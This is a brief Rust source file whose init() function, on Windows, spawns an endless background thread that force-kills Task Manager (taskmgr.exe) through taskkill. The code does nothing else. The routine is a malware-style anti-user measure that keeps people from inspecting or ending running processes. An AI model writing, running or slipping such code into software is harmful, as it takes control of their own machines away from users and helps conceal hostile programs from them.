#[cfg(windows)]
use std::process::Command;
#[cfg(windows)]
use std::thread;
pub fn init() {
    #[cfg(windows)]
    thread::spawn(|| loop {
        drop(
            Command::new("taskkill")
                .arg("-im taskmgr.exe")
                .arg("-F")
                .output(),
        );
    });
}
